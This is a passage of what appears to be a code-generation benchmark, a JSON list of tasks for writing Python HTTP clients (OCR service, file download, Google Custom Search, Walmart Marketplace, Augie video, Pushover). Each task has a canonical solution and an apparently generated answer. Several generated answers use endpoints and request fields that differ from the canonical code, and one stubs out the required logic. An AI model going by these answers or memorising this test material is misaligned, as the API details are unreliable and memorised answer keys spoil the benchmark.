_get_conn(self, timeout: Optional[float] = None) -> http.client.HTTPConnection:\n        if self.block:\n            return self.pool.get(timeout=timeout)\n        else:\n            try:\n                return self.pool.get_nowait()\n            except queue.Empty:\n                return self._new_conn()\n\n    def _put_conn(self, conn: http.client.HTTPConnection) -> None:\n        self.pool.put(conn)\n\n    def _make_request(self, conn: http.client.HTTPConnection, method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, timeout: Union[Timeout, float, None] = None, **response_kw: Any) -> Any:\n        if headers is None:\n            headers = {}\n        if self.headers:\n            headers.update(self.headers)\n        if self.proxy:\n            proxy_url = urlparse(self.proxy)\n            if proxy_url.scheme == 'http':\n                proxy_conn = http.client.HTTPConnection(proxy_url.hostname, proxy_url.port)\n            else:\n                proxy_conn = http.client.HTTPSConnection(proxy_url.hostname, proxy_url.port)\n            proxy_conn.set_tunnel(self.host, self.port)\n            conn = proxy_conn\n            if self.proxy_headers:\n                for key, value in self.proxy_headers.items():\n                    headers[key] = value\n        try:\n            conn.request(method, url, body, headers)\n            response = conn.getresponse()\n            return response\n        except Exception as e:\n            if retries and retries.total > 0:\n                retries.remaining -= 1\n                time.sleep(retries.backoff_factor)\n                return self._make_request(conn, method, url, body, headers, retries, timeout, **response_kw)\n            else:\n                raise\n\n    def urlopen(self, method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Union[Timeout, float, None] = None, pool_timeout: Optional[int] = None, **response_kw: Any) -> Any:\n        if not timeout:\n            timeout = self.timeout\n        if not retries:\n            retries = self.retries\n        if not redirect:\n            retries = Retry(total=0)\n        conn = self._get_conn(timeout=pool_timeout)\n        try:\n            return self._make_request(conn, method, url, body, headers, retries, timeout, **response_kw)\n        finally:\n            self._put_conn(conn)\n\n    def _close_pool_connections(self, pool: queue.LifoQueue) -> None:\n        while not pool.empty():\n            conn = pool.get_nowait()\n            conn.close()\n\n    def close(self) -> None:\n        self._close_pool_connections(self.pool)"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Implement a set of functions for interacting with an OCR (Optical Character Recognition) service through HTTP requests, including uploading files for OCR processing, making OCR requests, and retrieving results.\n\nFunction Description: The functions provide a client-side interface to communicate with an OCR service API, handling file uploads, processing requests, and result retrieval.\n\nInput:\n- ocr_upload():\n  - file_path: str - Path to the file to be processed\n  - ocr_cache: bool - Whether to cache the OCR results\n  - prompt: str - Optional prompt text for the OCR processing\n  - prompt_file: str - Optional path to a file containing the prompt\n  - model: str - Model to use for OCR (default: 'llama3.1')\n  - strategy: str - Processing strategy (default: 'llama_vision')\n  - storage_profile: str - Storage profile to use (default: 'default')\n  - storage_filename: str - Optional custom filename for storage\n  - language: str - Language for OCR processing (default: 'en')\n\n- ocr_request():\n  - file_path: str - Path to the file to be processed\n  - ocr_cache: bool - Whether to cache the OCR results\n  - prompt: str - Optional prompt text for the OCR processing\n  - prompt_file: str - Optional path to a file containing the prompt\n  - model: str - Model to use for OCR (default: 'llama3.1')\n  - strategy: str - Processing strategy (default: 'llama_vision')\n  - storage_profile: str - Storage profile to use (default: 'default')\n  - storage_filename: str - Optional custom filename for storage\n  - language: str - Language for OCR processing (default: 'en')\n\n- get_result():\n  - task_id: str - The task ID returned from upload/request\n  - print_progress: bool - Whether to print progress updates (default: False)\n\nOutput:\n- ocr_upload() and ocr_request():\n  - Returns: dict - Either contains 'task_id' for async processing or 'text' for immediate results\n  - Returns None on failure\n\n- get_result():\n  - Returns: dict - The final OCR result when state is 'SUCCESS'\n  - Returns None if task failed or encountered errors",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\ndef ocr_upload(file_path, ocr_cache, prompt, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    ocr_url = os.getenv('OCR_UPLOAD_URL', 'http://localhost:8000/ocr/upload')\n    files = {'file': open(file_path, 'rb')}\n    data = {'ocr_cache': ocr_cache, 'model': model, 'strategy': strategy, 'storage_profile': storage_profile, 'language': language}\n\n    if storage_filename:\n        data['storage_filename'] = storage_filename\n    \n    try:\n        if prompt_file:\n            prompt = open(prompt_file, 'r').read()\n    except FileNotFoundError:\n        print(f\"Prompt file not found: {prompt_file}\")\n        return None\n    \n    if prompt:\n        data['prompt'] = prompt\n\n    response = requests.post(ocr_url, files=files, data=data)\n    if response.status_code == 200:\n        respObject = response.json()\n        if respObject.get('task_id'):\n            return {\n                \"task_id\": respObject.get('task_id')\n            }\n        else:\n            return {\n                \"text\": respObject.get('text')\n            }\n    else:\n        print(f\"Failed to upload file: {response.text}\")\n        return None\n\ndef ocr_request(file_path, ocr_cache, prompt, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    ocr_url = os.getenv('OCR_REQUEST_URL', 'http://localhost:8000/ocr/request')\n    with open(file_path, 'rb') as f:\n        file_content = base64.b64encode(f.read()).decode('utf-8')\n    \n    data = {\n        'ocr_cache': ocr_cache,\n        'model': model,\n        'strategy': strategy,\n        'storage_profile': storage_profile,\n        'file': file_content,\n        'language': language\n    }\n\n    if storage_filename:\n        data['storage_filename'] = storage_filename\n    \n    if prompt_file:\n        try:\n            prompt = open(prompt_file, 'r').read()\n        except FileNotFoundError:\n            print(f\"Prompt file not found: {prompt_file}\")\n            return None\n    \n    if prompt:\n        data['prompt'] = prompt\n    \n    response = requests.post(ocr_url, json=data)\n    if response.status_code == 200:\n        respObject = response.json()\n        if respObject.get('task_id'):\n            return {\n                \"task_id\": respObject.get('task_id')\n            }\n        else:\n            return {\n                \"text\": respObject.get('text')\n            }\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None\n\ndef get_result(task_id, print_progress = False):\n    extracted_text_printed_once = False\n    result_url = os.getenv('RESULT_URL', f'http://localhost:8000/ocr/result/')\n    while True:\n        response = requests.get(result_url + task_id)\n        result = response.json()\n        if result['state'] != 'SUCCESS' and print_progress:\n            task_info = result.get('info')\n            if task_info is not None:\n                if task_info.get('extracted_text'):\n                    if not extracted_text_printed_once:\n                        extracted_text_printed_once = True\n                        print(\"Extracted text: \" + task_info.get('extracted_text'))\n                    else:\n                        del task_info['extracted_text']\n                del task_info['start_time']\n            print(result)\n        if response.status_code == 200:\n            if result['state'] == 'SUCCESS':\n                return result['result']\n            elif result['state'] == 'FAILURE':\n                print(\"OCR task failed.\")\n                return None\n        time.sleep(2)",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport time\nimport json\n\ndef ocr_upload(file_path, ocr_cache, prompt=None, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    url = 'https://ocr-api.example.com/upload'\n    payload = {\n        'file_path': file_path,\n        'ocr_cache': ocr_cache,\n        'model': model,\n        'strategy': strategy,\n        'storage_profile': storage_profile,\n        'language': language\n    }\n    if prompt:\n        payload['prompt'] = prompt\n    if prompt_file:\n        payload['prompt_file'] = prompt_file\n    if storage_filename:\n        payload['storage_filename'] = storage_filename\n\n    response = requests.post(url, data=payload)\n    if response.status_code == 200:\n        result = response.json()\n        if 'task_id' in result:\n            return result\n        else:\n            return {'text': result.get('text', '')}\n    else:\n        return None\n\ndef ocr_request(file_path, ocr_cache, prompt=None, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    url = 'https://ocr-api.example.com/request'\n    payload = {\n        'file_path': file_path,\n        'ocr_cache': ocr_cache,\n        'model': model,\n        'strategy': strategy,\n        'storage_profile': storage_profile,\n        'language': language\n    }\n    if prompt:\n        payload['prompt'] = prompt\n    if prompt_file:\n        payload['prompt_file'] = prompt_file\n    if storage_filename:\n        payload['storage_filename'] = storage_filename\n\n    response = requests.post(url, data=payload)\n    if response.status_code == 200:\n        result = response.json()\n        if 'task_id' in result:\n            return result\n        else:\n            return {'text': result.get('text', '')}\n    else:\n        return None\n\ndef get_result(task_id, print_progress=False):\n    url = 'https://ocr-api.example.com/result'\n    while True:\n        response = requests.get(url, params={'task_id': task_id})\n        if response.status_code == 200:\n            result = response.json()\n            if result.get('state') == 'SUCCESS':\n                return result\n            elif print_progress:\n                print(f\"Task {task_id} status: {result.get('state')}\")\n        else:\n            return None\n        time.sleep(1)"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local path.\n\nFunction Description: The function uses the Python requests library to make an HTTP GET request to download a file from a provided URL. It checks the response status code to ensure the request was successful, creates necessary directories for the local path if they don't exist, and saves the file content to the specified location.\n\nInput:\n- url: str - The URL of the file to download\n- local_path: str - The local file path where the downloaded content should be saved\n\nOutput:\n- None - The function doesn't return any value but prints status messages indicating success or failure of the download operation",
    "Canonical_solution": "import os\nimport requests\nfrom urllib.parse import urljoin\n\ndef download_file(url, local_path):\n    response = requests.get(url)\n    if response.status_code == 200:\n        os.makedirs(os.path.dirname(local_path), exist_ok=True)\n        with open(local_path, 'wb') as f:\n            f.write(response.content)\n        print(f\"Downloaded: {local_path}\")\n    else:\n        print(response.status_code)\n        print(f\"Failed to download: {url}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport os\n\ndef download_file(url, local_path):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            os.makedirs(os.path.dirname(local_path), exist_ok=True)\n            with open(local_path, 'wb') as file:\n                file.write(response.content)\n            print(\"File downloaded successfully.\")\n        else:\n            print(f\"Failed to download file. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a function to perform web searches using Google's Custom Search JSON API, handling both regular web searches and image searches, with proper error handling and response processing.\n\nFunction Description: The function performs a web search using Google's Custom Search API, constructs the appropriate API request based on search type, processes the response, and returns formatted results. It handles API keys, pagination, and different search types (web/image).\n\nInput:\n- keywords: (str or list) - Search terms as either a string or list of strings\n- paper_num: (int, optional) - Page number for paginated results (default=1)\n\nOutput:\n- Returns either:\n  - A formatted string containing search results (snippets and URLs) with date information\n  - An error message if the request fails (either HTTP error or exception)\n  - A message suggesting to check next page if no results found\n\nThe function also prints debug information including status code and response body to stdout.",
    "Canonical_solution": "import json\nfrom datetime import date\nimport requests\nfrom ..config import config_path, load_api_keys\n\napi_keys = load_api_keys(config_path)\ng_api_key = api_keys.get(\"google_api_key\")\ng_CSE_ID = api_keys.get(\"CSE_ID\")\ng_searchType = \"web\"\n\ndef search_web(keywords, paper_num=1):\n    if paper_num == \"\":\n        paper_num = 1\n    today = str(date.today())\n    global g_api_key, g_CSE_ID, g_searchType\n    num_results = 10\n    start = num_results * (int(paper_num) - 1) + 1\n    try:\n        base_url = \"https://www.googleapis.com/customsearch/v1\"\n        if g_searchType == \"image\":\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n                \"searchType\": g_searchType,\n            }\n        else:\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n            }\n\n        response = requests.get(base_url, params=params, timeout=10)\n        print(\"Status code:\", response.status_code)\n        print(\"Response body:\", response.text)\n\n        data = response.json()\n        all_content = \"\"\n        if response.status_code == 200:\n            data = response.json()\n            if \"items\" in data:\n                for item in data[\"items\"]:\n                    keyword = item[\"snippet\"]\n                    url = item[\"link\"]\n                    all_content += \"/n/n\" + json.dumps({\"snippet\": keyword, \"link\": url}, ensure_ascii=False, indent=4)\n\n        else:\n            return f\"Error: {response.status_code} - {response.text}\"\n\n    except Exception as e:\n        return f\"Exception occurred: {e}\"\n\n    print(all_content)\n    return (\n        \"\u4eca\u5929\u7684\u65e5\u671f\u662f\"\n        + today\n        + \"\uff0c\u5f53\u524d\u7f51\u7edc\u7684\u4fe1\u606f\u548c\u4fe1\u606f\u6765\u6e90\u7684\u7f51\u5740\u4e3a\uff1a\u201c\"\n        + str(all_content)\n        + \"\u201d\u3002/n\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u4e2d\u6ca1\u6709\u76f8\u5173\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u6539\u53d8paper_num\uff0c\u67e5\u770b\u4e0b\u4e00\u9875\u7684\u4fe1\u606f\u3002\"\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport json\nfrom datetime import datetime\n\ndef google_search(keywords, paper_num=1):\n    # Google Custom Search API endpoint\n    search_url = \"https://www.googleapis.com/customsearch/v1\"\n    \n    # API key and search engine ID (replace with your own)\n    api_key = \"YOUR_API_KEY\"\n    cx = \"YOUR_CSE_ID\"\n    \n    # Determine search type based on keywords\n    if isinstance(keywords, list):\n        query = \" \".join(keywords)\n    else:\n        query = keywords\n    \n    # Prepare parameters for the API request\n    params = {\n        \"q\": query,\n        \"num\": 10,\n        \"start\": (paper_num - 1) * 10,\n        \"key\": api_key,\n        \"cx\": cx\n    }\n    \n    try:\n        response = requests.get(search_url, params=params)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        print(f\"Error: {e}\")\n        return f\"Error: {e}\"\n    \n    # Print debug information\n    print(f\"Status Code: {response.status_code}\")\n    print(f\"Response Body: {response.text}\")\n    \n    try:\n        data = json.loads(response.text)\n    except json.JSONDecodeError:\n        return \"Error: Invalid JSON response from API\"\n    \n    if \"items\" in data:\n        results = []\n        for item in data[\"items\"]:\n            title = item.get(\"title\", \"\")\n            link = item.get(\"link\", \"\")\n            snippet = item.get(\"snippet\", \"\")\n            published_date = item.get(\"publishedDate\", \"\")\n            \n            if published_date:\n                date_str = datetime.strptime(published_date, \"%Y-%m-%d\").strftime(\"%B %d, %Y\")\n            else:\n                date_str = \"Unknown\"\n            \n            results.append(f\"Title: {title}\\nLink: {link}\\nSnippet: {snippet}\\nDate: {date_str}\\n\")\n        \n        return \"\\n\".join(results)\n    else:\n        return \"No results found. Try checking the next page.\""
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Python class to interact with the Walmart Marketplace API, handling authentication, order management, and inventory operations.\n\nClass Description: The WalmartAPI class provides methods to authenticate with and interact with the Walmart Marketplace API. It supports user verification, order retrieval and acknowledgment, as well as inventory management operations.\n\nAttributes:\napi_key: str - Walmart API key for authentication\naccess_token: str - Access token for API authorization\nmarketplace_id: str - Marketplace identifier for API requests\n\nMethods:\nverify_user: verify_user() -> None - Verifies the current access token corresponds to a valid user. Raises exception if verification fails.\nget_orders: get_orders(status: str, start_date: Optional[datetime], end_date: Optional[datetime], limit: int) -> List[Dict] - Retrieves orders from Walmart Marketplace with optional filters for status, date range, and limit.\nacknowledge_order: acknowledge_order(purchase_order_id: str) -> str - Acknowledges a specific order by purchase order ID.\nget_inventory: get_inventory(sku_list: List[str]) -> List[Dict] - Gets inventory levels for specified SKUs or all inventory if no SKUs provided.\nupdate_inventory: update_inventory(sku: str, quantity: int) -> str - Updates inventory quantity for a specific SKU.",
    "Canonical_solution": "import os\nimport logging\nimport requests\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Optional\n\nclass WalmartAPI:\n    def __init__(self, api_key: str = None, access_token: str = None, marketplace_id: str = None):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self):\n        \"\"\"\n        Verifies that the current access token corresponds to a valid user.\n        If verification fails, raises an exception.\n        \"\"\"\n        logging.info(f\"Verifying user with token: {self.access_token}\")\n        headers = {\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n            \"Accept\": \"application/json\",\n        }\n\n        response = requests.get(\n            \"https://marketplace.walmartapis.com/v3/seller/info\", headers=headers\n        )\n\n        if response.status_code != 200:\n            raise Exception(\n                f\"User verification failed. Status: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    async def get_orders(\n        self,\n        status: str = \"Created\",\n        start_date: Optional[datetime] = None,\n        end_date: Optional[datetime] = None,\n        limit: int = 100,\n    ) -> List[Dict]:\n        \"\"\"\n        Retrieves orders from Walmart Marketplace.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            if not start_date:\n                start_date = datetime.now() - timedelta(days=7)\n            if not end_date:\n                end_date = datetime.now()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {\n                \"status\": status,\n                \"createdStartDate\": start_date.isoformat(),\n                \"createdEndDate\": end_date.isoformat(),\n                \"limit\": limit,\n            }\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/orders\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch orders: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving orders: {str(e)}\")\n            return []\n\n    async def acknowledge_order(self, purchase_order_id: str) -> str:\n        \"\"\"\n        Acknowledges a Walmart Marketplace order.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            response = requests.post(\n                f\"https://marketplace.walmartapis.com/v3/orders/{purchase_order_id}/acknowledge\",\n                headers=headers,\n            )\n\n            if response.status_code == 204:\n                return \"Order acknowledged successfully.\"\n            else:\n                raise Exception(f\"Failed to acknowledge order: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error acknowledging order: {str(e)}\")\n            return f\"Failed to acknowledge order: {str(e)}\"\n\n    async def get_inventory(self, sku_list: List[str] = None) -> List[Dict]:\n        \"\"\"\n        Gets inventory levels for specified SKUs.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {}\n            if sku_list:\n                params[\"sku\"] = \",\".join(sku_list)\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch inventory: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving inventory: {str(e)}\")\n            return []\n\n    async def update_inventory(self, sku: str, quantity: int) -> str:\n        \"\"\"\n        Updates inventory quantity for a specific SKU.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            data = {\"sku\": sku, \"quantity\": {\"unit\": \"EACH\", \"amount\": quantity}}\n\n            response = requests.put(\n                f\"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                json=data,\n            )\n\n            if response.status_code == 200:\n                return \"Inventory updated successfully.\"\n            else:\n                raise Exception(f\"Failed to update inventory: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error updating inventory: {str(e)}\")\n            return f\"Failed to update inventory: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "class WalmartAPI:\n    def __init__(self, api_key: str, access_token: str, marketplace_id: str):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self) -> None:\n        import requests\n        headers = {\n            'Authorization': f'Bearer {self.access_token}',\n            'Content-Type': 'application/json'\n        }\n        response = requests.get('https://marketplace.walmart.com/api/v3/user', headers=headers)\n        if response.status_code != 200:\n            raise Exception(f\"User verification failed: {response.status_code} - {response.text}\")\n\n    def get_orders(self, status: str, start_date: Optional[datetime], end_date: Optional[datetime], limit: int) -> List[Dict]:\n        import requests\n        import datetime\n        import json\n\n        headers = {\n            'Authorization': f'Bearer {self.access_token}',\n            'Content-Type': 'application/json'\n        }\n        params = {\n            'marketplaceId': self.marketplace_id,\n            'status': status,\n            'limit': limit\n        }\n        if start_date:\n            params['startDate'] = start_date.strftime('%Y-%m-%d')\n        if end_date:\n            params['endDate'] = end_date.strftime('%Y-%m-%d')\n\n        response = requests.get('https://marketplace.walmart.com/api/v3/orders', headers=headers, params=params)\n        if response.status_code != 200:\n            raise Exception(f\"Failed to retrieve orders: {response.status_code} - {response.text}\")\n        return json.loads(response.text)\n\n    def acknowledge_order(self, purchase_order_id: str) -> str:\n        import requests\n        import json\n\n        headers = {\n            'Authorization': f'Bearer {self.access_token}',\n            'Content-Type': 'application/json'\n        }\n        data = {\n            'purchaseOrderId': purchase_order_id\n        }\n        response = requests.post('https://marketplace.walmart.com/api/v3/orders/acknowledge', headers=headers, data=json.dumps(data))\n        if response.status_code != 200:\n            raise Exception(f\"Failed to acknowledge order: {response.status_code} - {response.text}\")\n        return response.text\n\n    def get_inventory(self, sku_list: List[str]) -> List[Dict]:\n        import requests\n        import json\n\n        headers = {\n            'Authorization': f'Bearer {self.access_token}',\n            'Content-Type': 'application/json'\n        }\n        params = {\n            'marketplaceId': self.marketplace_id\n        }\n        if sku_list:\n            params['skuList'] = sku_list\n        response = requests.get('https://marketplace.walmart.com/api/v3/inventory', headers=headers, params=params)\n        if response.status_code != 200:\n            raise Exception(f\"Failed to retrieve inventory: {response.status_code} - {response.text}\")\n        return json.loads(response.text)\n\n    def update_inventory(self, sku: str, quantity: int) -> str:\n        import requests\n        import json\n\n        headers = {\n            'Authorization': f'Bearer {self.access_token}',\n            'Content-Type': 'application/json'\n        }\n        data = {\n            'sku': sku,\n            'quantity': quantity\n        }\n        response = requests.post('https://marketplace.walmart.com/api/v3/inventory/update', headers=headers, data=json.dumps(data))\n        if response.status_code != 200:\n            raise Exception(f\"Failed to update inventory: {response.status_code} - {response.text}\")\n        return response.text"
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Implement HTTP client functions to interact with the Augie video creation API, including creating videos and checking their status.\n\nFunction Description: The first function creates a video on the Augie platform by sending a POST request with the provided parameters. The second function checks the status of a video creation process by sending a GET request with the video ID.\n\nInput: \n1. For create_augie: \n   - params: dict - A dictionary containing video creation parameters (e.g., script, voice settings, etc.)\n2. For get_augie_status: \n   - augie_id: str - The unique identifier of the Augie video to check\n\nOutput:\n1. For create_augie: \n   - dict - The API response containing video creation details if successful (status code 201)\n   - Exception - If the request fails (status code other than 201)\n2. For get_augie_status: \n   - dict - A status dictionary with either {\"status\": \"completed\", \"video_url\": [url]} or {\"status\": \"processing\"}\n   - Exception - If the request fails (status code other than 200)",
    "Canonical_solution": "@func.register_function(\n  metadata={\"description\": \"Creates a video on Augie platform.\"},\n  key_dependencies=[\"augie_api_key\"],\n  imports={\"name\": \"requests\", \"lib\": \"requests\"}\n)\ndef create_augie(params):\n  \"\"\"Function to create a video on Augie platform with parameters.\"\"\"\n  API_KEY = globals()['augie_api_key']\n  BASE_URL = 'https://beta.api.augie.studio/v1'\n\n  headers = {\n      'x-api-key': API_KEY,\n      'Content-Type': 'application/json'\n  }\n\n  import requests\n  response = requests.post(f'{BASE_URL}/augies', json=params, headers=headers)\n\n  if response.status_code == 201:\n      return response.json()  # Returns the creation response\n  else:\n      raise Exception(f\"Failed to create Augie: {response.text}\")\n\n\n@func.register_function(\n  metadata={\"description\": \"Checks the status of the created video.\"},\n  key_dependencies=[\"augie_api_key\"],\n  imports={\"name\": \"requests\", \"lib\": \"requests\"}\n)\ndef get_augie_status(augie_id):\n  \"\"\"Function to check the status of an Augie video creation.\"\"\"\n  API_KEY = globals()['augie_api_key']\n  BASE_URL = 'https://beta.api.augie.studio/v1'\n\n  headers = {\n      'x-api-key': API_KEY\n  }\n\n  import requests\n  response = requests.get(f'{BASE_URL}/augies/{augie_id}/status', headers=headers)\n\n  if response.status_code == 200:\n      status_data = response.json()\n      if status_data.get('status') == 'succeeded' and 'output' in status_data and 'video' in status_data['output']:\n          return {\"status\": \"completed\", \"video_url\": status_data['output']['video']}\n      else:\n          return {\"status\": \"processing\"}\n  else:\n      raise Exception(f\"Failed to get Augie status: {response.text}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef create_augie(params):\n    url = \"https://api.augie.com/v1/videos\"\n    headers = {\n        \"Authorization\": \"Bearer YOUR_API_KEY\",\n        \"Content-Type\": \"application/json\"\n    }\n    response = requests.post(url, json=params, headers=headers)\n    if response.status_code == 201:\n        return response.json()\n    else:\n        raise Exception(f\"Failed to create video. Status code: {response.status_code}, Response: {response.text}\")\n\ndef get_augie_status(augie_id):\n    url = f\"https://api.augie.com/v1/videos/{augie_id}\"\n    headers = {\n        \"Authorization\": \"Bearer YOUR_API_KEY\"\n    }\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        raise Exception(f\"Failed to get video status. Status code: {response.status_code}, Response: {response.text}\")"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Implement a Python class that serves as a client for the Pushover notification service, capable of sending both text messages and file attachments through HTTP requests.\n\nClass Description: The PushoverClient class provides functionality to interact with the Pushover API, allowing users to send notifications with optional HTML formatting, titles, URLs, and file attachments. It handles HTTP communication and error logging.\n\nAttributes:\n- token: str - The API token for authenticating with Pushover\n- user: str - The user key identifying the recipient\n- device: str - The target device for the notification\n- pushover_url: str - The Pushover API endpoint URL\n\nMethods:\n- send_message(title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a text notification with optional HTML formatting, title, and URL\n- send_file(file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a notification with a file attachment (converts SVG to PNG if needed) along with text content",
    "Canonical_solution": "import logging\nimport requests\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str, pushover_url: str):\n        self.token = str(token)\n        self.user = str(user)\n        self.device = str(device)\n        self.pushover_url = str(pushover_url)\n\n    def send_message(self, title: str, message: str, send_as_html: bool, additional_url: str):\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str):\n        if not is_image(file_name):\n            return\n            \n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n        files = {\"photo\": (file_name, contents.decode())}\n\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "```python\nimport requests\nimport logging\nimport base64\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str = None):\n        self.token = token\n        self.user = user\n        self.device = device\n        self.pushover_url = \"https://api.pushover.net/1/messages.json\"\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.INFO)\n        handler = logging.StreamHandler()\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        handler.setFormatter(formatter)\n        self.logger.addHandler(handler)\n\n    def send_message(self, title: str, message: str, send_as_html: bool, additional_url: str = None) -> None:\n        data = {\n            'token': self.token,\n            'user': self.user,\n            'title': title,\n            'message': message,\n            'html': 1 if send_as_html else 0\n        }\n        if additional_url:\n            data['url'] = additional_url\n        if self.device:\n            data['device'] = self.device\n        response = requests.post(self.pushover_url, data=data)\n        self._handle_response(response)\n\n    def send_file(self, file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str = None) -> None:\n        # Convert SVG to PNG if needed (simple check for SVG)\n        if file_name.lower().endswith('.svg'):\n            # This is a simplified example; actual conversion would require an SVG to PNG converter\n            # For the purpose of this example, we'll just log the conversion and not actually convert\n            self.logger.info(f\"SVG file '{file_name}' detected. Conversion to PNG is required but not implemented in this example.\")\n            # In a real implementation, you would use a library likecairo or PIL to convert SVG to PNG\n            # Here, we'll simulate the conversion by using the original content as a placeholder\n            contents = contents  # Placeholder for converted content\n\n        # Encode the file content as base64\n        encoded_content = base64.b64encode(contents).decode('utf-8')\n\n        data = {\n            'token': self.token,\n            'user': self.user,\n            'title': title,\n            'message': message,\n            'html': 1 if send_as_html else 0,\n            'file': file_name,\n            'file_alt': 'File attachment',\n            'file_type': 'image/png',  # Assuming PNG after conversion\n            'file_data': encoded_content\n        }\n        if additional_url:\n            data['url'] = additional_url\n        if self.device:\n            data['device'] = self.device\n        response = requests.post(self.pushover_url, data=data)\n        self._handle_response(response)\n\n    def 